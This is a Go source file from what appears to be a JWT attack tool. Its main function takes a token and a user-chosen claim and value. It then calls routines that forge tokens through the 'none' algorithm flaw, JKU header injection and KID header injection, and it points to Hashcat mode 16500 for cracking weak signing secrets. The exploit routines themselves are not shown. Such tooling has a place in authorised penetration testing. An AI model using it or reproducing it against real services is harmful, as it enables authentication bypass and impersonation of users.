package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
)

func MainMagic(jwtStr string, userHeader string, userValue string) {

	token := ctrl.StringToToken(jwtStr)

	if token == nil {
		fmt.Print("Error : Unable to parse the JWT\n")
		return
	}

	//It should always contains the "alg" header, but we check nevertheless
	if _, ok := token.Header["alg"]; ok {
		fmt.Print("Checking if the token is vulnerable to the \"none\" algorithm vuln\n\n")
		newJWTStr := ExploitNoneAlgo(token, userHeader, userValue)
		fmt.Printf("None algorithm : %s\n\n", newJWTStr)
		fmt.Print("------------------------------------------------------\n\n")
		fmt.Print("You can use Hashcat with the mode 16500 to verify if the JWT is signed with a weak secret\n\n")
		fmt.Print("------------------------------------------------------\n\n")
	}

	if _, ok := token.Header["jku"]; ok {
		fmt.Print("Your token contains the \"JKU\" header, it can maybe be exploitable through header injection\n\n")
		newJWTStr := ExploitJKU(token, userHeader, userValue)
		fmt.Printf("JKU header injection : %s\n\n", newJWTStr)
		fmt.Print("------------------------------------------------------\n\n")
	}

	if _, ok := token.Header["kid"]; ok {
		fmt.Print("Your token contains the \"KID\" header, it can maybe be exploitable through header injection\n\n")
		newJWTStr := ExploitKID(token)
		fmt.Printf("KID header injection : %s\n", newJWTStr)
		fmt.Print("------------------------------------------------------\n\n")
	}

}
